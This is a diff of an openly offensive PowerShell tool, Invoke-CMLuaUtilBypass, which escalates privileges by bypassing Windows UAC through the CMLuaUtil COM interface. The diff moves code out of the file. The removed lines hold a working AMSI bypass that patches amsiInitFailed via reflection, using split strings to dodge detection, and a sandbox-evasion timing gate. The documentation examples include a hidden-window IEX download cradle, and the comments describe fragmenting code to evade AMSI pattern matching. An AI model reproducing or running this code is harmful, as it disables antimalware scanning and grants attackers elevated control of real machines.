@@ -69,15 +69,9 @@
       "/c whoami > C:\Temp\result.txt"
       "-NoP -W Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('...')`""
 
-.PARAMETER SkipAMSI
-    Skip AMSI mitigation step.
-
-.PARAMETER SkipChecks
-    Skip preflight environment checks.
-
 .EXAMPLE
     # Open an elevated cmd prompt
-    Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe" -SkipChecks
+    Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe"
 
 .EXAMPLE
     # Run elevated PowerShell with a command
@@ -90,6 +84,8 @@
     Add-Type compilation happens in-process — no temp .cs file written.
     The C# type definitions are fragmented across string concatenations
     to reduce static AMSI / CS pattern-match surface area.
+    Dot-source Core\Invoke-UACCore.ps1 before calling this function for
+    AMSI mitigation and preflight checks.
 #>
 
 [CmdletBinding(SupportsShouldProcess)]
@@ -99,61 +95,11 @@ param(
     [string]$Payload,
 
     [Parameter(Position = 1)]
-    [string]$Arguments = '',
-
-    [switch]$SkipAMSI,
-    [switch]$SkipChecks
+    [string]$Arguments = ''
 )
 
 Set-StrictMode -Off
 $ErrorActionPreference = 'SilentlyContinue'
-
-#region ── AMSI mitigation ───────────────────────────────────────────────────
-if (-not $SkipAMSI) {
-    try {
-        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
-                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
-                  Select-Object -First 1
-        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
-        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
-        $xF.SetValue($null, $true)
-    } catch {}
-}
-#endregion
-
-#region ── Preflight gate ────────────────────────────────────────────────────
-if (-not $SkipChecks) {
-
-    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
-                      [Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Warning '[CMLuaUtil] Already elevated — no bypass needed.'
-        return
-    }
-
-    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
-    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
-    catch { $xBeh = 5 }
-    if ($xBeh -le 2) {
-        Write-Warning "[CMLuaUtil] AlwaysNotify active (behavior=$xBeh) — method will not work silently."
-        return
-    }
-    if ($xBeh -eq 1) {
-        Write-Warning '[CMLuaUtil] Credential prompt mode (behavior=1) — dialog will appear.'
-    }
-
-    # Timing gate
-    $xH = [System.Security.Cryptography.SHA256]::Create()
-    $xB = [byte[]]::new(65536)
-    $xT0 = [DateTime]::UtcNow
-    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
-    $xH.Dispose()
-    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
-        Write-Warning '[CMLuaUtil] Timing anomaly — aborting.'
-        return
-    }
-}
-#endregion
 
 #region ── COM interface & P/Invoke type definition ──────────────────────────
 #
